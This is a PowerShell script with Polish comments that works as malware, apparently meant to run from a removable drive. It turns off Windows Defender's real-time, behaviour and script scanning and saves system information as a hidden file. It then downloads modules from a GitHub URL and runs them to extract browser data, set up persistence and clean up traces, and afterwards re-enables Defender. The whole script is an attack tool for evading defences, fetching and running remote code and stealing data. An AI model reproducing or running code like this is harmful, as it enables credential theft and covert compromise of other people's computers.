#region Inicjalizacja
$ErrorActionPreference = 'SilentlyContinue'
$repoUrl = "https://raw.githubusercontent.com/TwojeRepo/main/"

# Funkcja do szyfrowania danych
function Encrypt-Data {
    param($Data)
    $secure = ConvertTo-SecureString $Data -AsPlainText -Force
    return ConvertFrom-SecureString $secure
}

#region Mechanizmy Ochronne
# Tymczasowe wyłączenie Windows Defender
Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction SilentlyContinue
Set-MpPreference -DisableScriptScanning $true -ErrorAction SilentlyContinue

#region Główna Logika
try {
    # Tworzenie zabezpieczonego pliku z danymi systemowymi
    $systemData = systeminfo | Out-String
    $encryptedData = Encrypt-Data -Data $systemData
    $secureFilePath = "E:\SystemData_$(Get-Date -Format 'yyyyMMdd_HHmmss').enc"
    $encryptedData | Out-File -FilePath $secureFilePath
    attrib +s +h $secureFilePath

    # Pobranie i wykonanie modułów
    $modules = @('BrowserData.ps1', 'Persistence.ps1', 'Cleanup.ps1')
    foreach ($module in $modules) {
        $moduleUrl = "$repoUrl$module"
        $modulePath = "E:\$module"
        
        # Pobierz z walidacją TLS
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
        (New-Object Net.WebClient).DownloadFile($moduleUrl, $modulePath)
        
        # Wykonaj moduł w obecnym zakresie
        . $modulePath
    }
    
    # Wywołanie funkcji z modułów
    Extract-BrowserData
    Set-Persistence
    Invoke-Cleanup
}
catch {
    $_ | Out-File "E:\ErrorLog_$(Get-Date -Format 'yyyyMMdd_HHmmss').txt"
}
finally {
    # Przywrócenie ustawień Defender
    Set-MpPreference -DisableRealtimeMonitoring $false -ErrorAction SilentlyContinue
    Set-MpPreference -DisableBehaviorMonitoring $false -ErrorAction SilentlyContinue
    Set-MpPreference -DisableScriptScanning $false -ErrorAction SilentlyContinue
}
#endregion
